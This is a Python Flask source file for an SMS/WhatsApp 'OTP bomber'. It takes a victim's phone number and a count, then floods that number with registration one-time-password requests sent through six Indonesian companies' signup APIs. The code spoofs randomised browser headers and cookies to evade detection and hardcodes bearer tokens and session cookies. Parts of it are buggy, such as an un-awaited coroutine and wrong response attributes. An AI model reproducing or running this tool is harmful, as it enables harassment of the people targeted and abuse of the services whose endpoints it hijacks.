from flask import Flask, request, render_template, redirect, url_for, flash
import requests, json, random, uuid
import os
import asyncio
import aiohttp
app = Flask(__name__)
app.secret_key = "b'\xfd!\x11\x9frZ%\x93Ip\xbf\xdb8{-B\x14\xb9\xa58B\xa6\xc8\x15'"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 9999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 9999999999)}.1.1.{random.randint(1000000000, 9999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 9999999999)}~lva~{random.randint(1000000000, 9999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 9999999999)}~v11.lhb~{random.randint(1000000000, 9999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 9999999999)}~lcw~{random.randint(1000000000, 9999999999)}"

def format_phone_number(provider, phone_number):
    if provider in ['matahari', 'nutriclub']:
        return phone_number.replace("+62", "0")
    elif provider in ['mraladin', 'pinhome', 'saturdays']:
        return phone_number.replace("+62", "")
    elif provider in ['sobatbangun', 'ruangguru', 'bpjsktn']:
        return phone_number.replace("+62", "62")
    else:
        return phone_number

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        otp_count = int(request.form['otp_count'])
        flash(f'Successfully Sent {otp_count} OTPs to {phone_number}')
        send_otp(phone_number, otp_count)
        return redirect(url_for('index'))
    return render_template('index.html')

async def send_otp_request(session, provider, formatted_phone_number):
    try:
        if provider == 'danacita':
            headers_danacita = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Content-Length": str(random.randint(20, 50)), 
                "Content-Type": "application/json",
                "Cookie": generate_cookie(),
                "Origin": "https://app.danacita.co.id",
                "Referer": "https://app.danacita.co.id/",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent()
            }
        
            data_danacita = json.dumps({
                "username": formatted_phone_number,
            })
            
            async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita) as response_danacita:
                if response_danacita.status_code == 200:
                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Danacita")
                else:
                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Danacita")
        
        if provider == 'misteraladin':
            headers_misterAladin = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Authorization": "Bearer null",
                "Content-Length": str(random.randint(20, 50)),
                "Content-Type": "application/json;charset=UTF-8",
                "Cookie": "offer_id=103180; utm_source=involveasia; _ga=GA1.2.40616470.1718982768; _gid=GA1.2.1272049545.1718982768; Lda_aKUr6BGRn=everydaysi.com/r/v2?; G_ENABLED_IDPS=google; Ac_aqK8DtrDL=1; Fm_kZf8ZQvmX=1; __cfruid=de4c77417ef8c7b1aab81ffb4fceadf9762578dc-1719067746; click_id=710414e9316844668c613db0eb3e8f7f; utm_medium=1637-710414e9316844668c613db0eb3e8f7f; _gat=1; _ga_PLKRYTK7YG=GS1.2.1719067732.2.1.1719067735.57.0.0",
                "Origin": "https://www.misteraladin.com",
                "Priority": "u=1, i",
                "Referer": "https://www.misteraladin.com/register",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent(),
                "X-Platform": "web"
            }
            
            data_misterAladin = json.dumps({
                "phone_number_country_code": "62",
                "phone_number": formatted_phone_number,
                "type": "register"
            })
            
            async with session.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin) as response_misterAladin: 
                if response_misterAladin.status_code == 200:
                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
                else: 
                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")

        if provider == 'pinhome':
            headers_pinhome = {
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
                "Content-Length": str(random.randint(20, 50)),
                "Content-Type": "application/json",
                "Cookie": "_gcl_au=1.1.246269231.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _gcl_au=1.1.246269231.1718959212; _ga=GA1.1.127919491.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _ga_CYRVZ1HEXG=GS1.1.1718959211.1.0.1718959212.0.0.0; _hhcftd=1618a140204983c645ecd5c7e4f60381cdecf115; _clck=1iujwii%7C2%7Cfmv%7C0%7C1633; _clsk=hty05m%7C1719102661534%7C1%7C1%7Ch.clarity.ms%2Fcollect; ph_phc_vIu9D3s1qIMPGaAkpBsgyBhRUFKtuyS7qUqeo35W873_posthog=%7B%22distinct_id%22%3A%22019039f4-0639-73c4-bba9-8c71ae7a0b93%22%2C%22%24sesid%22%3A%5B1719102662482%2C%2201904280-df2e-7d49-b1ac-8ece3e8cb4fd%22%2C1719102660398%5D%7D; _gid=GA1.2.275863447.1719102663; _ga_Y1EHRSKVLJ=GS1.1.1719102663.1.0.1719102663.60.0.0; _ga=GA1.2.127919491.1718959212; _ga_CYRVZ1HEXG=GS1.1.1719102660.2.1.1719102667.0.0.0",
                "Origin": "https://www.pinhome.id",
                "Priority": "u=1, i",
                "Referer": "https://www.pinhome.id/daftar",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent(),
                "X-Auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
            }
            
            data_pinhome = json.dumps({
                "accountType": "customers",
                "countryCode": "62",
                "medium": "whatsapp",
                "otpType": "register",
                "phoneNumber": formatted_phone_number
            })
            
            async with session.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome) as response_pinhome: 
                if response_pinhome.status_code == 201:
                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
                else:
                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
        
        if provider == 'kelaspintar':
            headers_kelaspintar = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Authorization": "Bearer undefined",
                "Content-Length": str(random.randint(20, 50)),
                "Content-Type": "application/json",
                "Origin": "https://www.kelaspintar.id",
                "Priority": "u=1, i",
                "Referer": "https://www.kelaspintar.id/",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent()
            }
            
            data_kelaspintar = json.dumps({
                "phone_number": formatted_phone_number,
            })
            
            async with session.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar) as response_kelaspintar:  
                if response_kelaspintar.status_code == 200:
                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
                else:
                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
        
        if provider =='sobatbangun':
            headers_sobatbang = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Content-Length": str(random.randint(100, 200)),
                "Content-Type": "application/json",
                "Origin": "https://www.sobatbangun.com",
                "Priority": "u=1, i",
                "Referer": "https://www.sobatbangun.com/",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent()
            }
            
            data_sobatbangun = json.dumps({
                "email_or_phone": formatted_phone_number,
            })
            
            async with session.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun) as response_sobatbangun:  
                if response_sobatbangun.status_code == 201:
                    print(f"Berhasil mengirim OTP To : {formatted_phone_number} via SobatBangun")
                else:
                    print(f"Gagal mengirim OTP To : {formatted_phone_number} via SobatBangun")
        if provider == 'nutriclub':
            headers_nutriclub = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": generate_accept_language(),
                "Content-Length": str(random.randint(100, 200)),
                "Origin": "https://www.nutriclub.co.id",
                "Priority": "u=1, i",
                "Referer": "https://www.nutriclub.co.id/membership/registration",
                "Sec-Ch-Ua": generate_sec_ch_ua(),
                "Sec-Ch-Ua-Mobile": f"{random.randint(0, 1)}",
                "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
                "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
                "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
                "User-Agent": generate_user_agent(),
                "X-Requested-With": "XMLHttpRequest"
            }
                    
            data_nutriclub = json.dumps({
                "phone": formatted_phone_number,
                "old_phone": formatted_phone_number,
            })
                    
            async with session.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub) as response_nutriclub:
                if response_nutriclub.status_code == 200:
                    print(f"Berhasil mengirim OTP To: {formatted_phone_number} via Nutriclub")
                else:
                    print(f"Gagal mengirim OTP To: {formatted_phone_number} via Nutriclub")
    except Exception as e:
        print(f"An error occurred while sending OTP via {provider}: {e}")

async def send_otp(phone_number, otp_count):
    providers = ['danacita', 'misteraladin', 'pinhome', 'kelaspintar', 'sobatbangun', 'nutriclub']
    formatted_phone_number = format_phone_number('sayurbox', phone_number)

    async with aiohttp.ClientSession() as session:
        tasks = [send_otp_request(session, provider, formatted_phone_number) for provider in providers for _ in range(otp_count)]
        await asyncio.gather(*tasks)
                
if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(send_otp('+628123456789', 5))
    app.run(debug=True)
